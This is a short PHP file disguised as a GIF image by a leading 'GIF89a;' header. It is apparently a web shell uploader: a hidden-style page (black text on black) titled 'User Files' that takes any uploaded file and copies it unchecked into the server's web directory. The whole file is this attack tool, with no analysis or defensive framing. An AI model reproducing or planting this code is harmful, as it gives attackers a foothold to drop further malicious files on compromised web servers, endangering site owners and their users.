GIF89a;
<html>
<head>
<body text="#000000" bgcolor="#000000">
<title>User Files</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Ok !!!</b><br><br>'; }
	else { echo '<b>Bad !!!</b><br><br>'; }
}
?>
